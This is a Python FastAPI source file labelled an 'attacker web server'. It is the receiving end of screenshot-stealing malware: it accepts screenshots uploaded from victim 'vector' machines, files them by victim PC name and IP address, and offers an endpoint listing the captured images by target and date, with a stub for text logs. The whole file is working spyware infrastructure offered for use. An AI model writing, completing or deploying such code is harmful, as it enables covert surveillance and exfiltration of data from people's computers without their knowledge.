import re
from datetime import datetime
from pathlib import Path

from fastapi import FastAPI, File, UploadFile, Form, Query, HTTPException
import os

app = FastAPI()

screenshots_folder_path = Path('screenshots')

def sanitize_filename(filename: str) -> str:
    # Replace forbidden characters in filename for Windows compatibility
    return re.sub(r'[<>:"/\\|?*]', "_", filename)

@app.get("/")
async def root():
    return {"attacker web server status": "on"}

@app.post("/upload")
async def upload_image(
    file: UploadFile = File(...),
    vector_pc_name: str = Form(...),
    client_address: str = Form(...)
):
    # save ss to a folder
    global screenshots_folder_path
    # create folder for vector if not existing
    screenshot_folder_path = os.path.join(screenshots_folder_path, vector_pc_name + '-' + client_address)
    os.makedirs(screenshot_folder_path, exist_ok=True)
    current_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print("Current Timestamp:", current_timestamp)
    screenshot_folder_path = screenshots_folder_path / sanitize_filename(f"{vector_pc_name}-{client_address}")
    screenshot_folder_path.mkdir(parents=True, exist_ok=True)
    screenshot_file_path = screenshot_folder_path / sanitize_filename(f"{current_timestamp}.jpg")
    # Save the file
    with open(screenshot_file_path, "wb") as buffer:
        buffer.write(await file.read())

    return {"filename": file.filename, "message": "File uploaded successfully"}

def get_image_logs(target: str, start_dt: datetime, end_dt: datetime):
    logs = []
    for folder in screenshots_folder_path.iterdir():
        for file in folder.iterdir():
            if target and target != folder.name:
                continue  # Skip this folder if the target is not contained in the folder name
            # print(f"Processing file: {file.name}")  # Debugging line
            # Replace underscores with colons in the timestamp part
            try:
                # Get the filename without the extension
                file_name = file.stem
                # Replace underscores with colons for correct timestamp format
                corrected_file_name = file_name.replace('_', ':')
                # Parse the timestamp
                file_timestamp = datetime.strptime(corrected_file_name, "%Y-%m-%d %H:%M:%S")
                # print(f"Parsed timestamp: {file_timestamp}")  # Debugging line
            except ValueError:
                print(f"Skipping file: {file.name} due to invalid timestamp format")  # Debugging line
                continue  # Skip files that don't match the expected format

            print(file_timestamp)
            # Filter based on the provided date range
            if start_dt <= file_timestamp <= end_dt:
                logs.append({
                    "vector": folder.name,
                    "screenshot": file.name,
                    "path": str(file),
                    "timestamp": file_timestamp.strftime("%Y-%m-%d %H:%M:%S"),
                })
    return logs

def get_text_logs(target: str, start_dt: datetime, end_dt: datetime):
    logs = []



    return logs

@app.get("/logs")
async def get_screenshots(
    target: str = Query(None, description="Specific target vector name (vector_pc_name-client_address)"),
    start_date: str = Query(None, description="Start date in YYYY-MM-DD format"),
    end_date: str = Query(None, description="End date in YYYY-MM-DD format"),
    textLogs: bool = Query(default=False, description="If you want text logs")
):
    # Parse the dates if provided
    try:
        start_dt = datetime.strptime(start_date, "%Y-%m-%d") if start_date else None
        end_dt = datetime.strptime(end_date, "%Y-%m-%d") if end_date else None
    except ValueError:
        raise HTTPException(status_code=400, detail="Invalid date format. Use YYYY-MM-DD.")

    print(f"start dt : {start_dt}")
    print(f"end dt : {end_dt}")

    if not textLogs:
        return get_image_logs(target, start_dt, end_dt)
    return get_text_logs(target, start_dt, end_dt)


if __name__ == '__main__':
    import uvicorn

    uvicorn.run(app, host="127.0.0.1", port=8000, log_level="info")
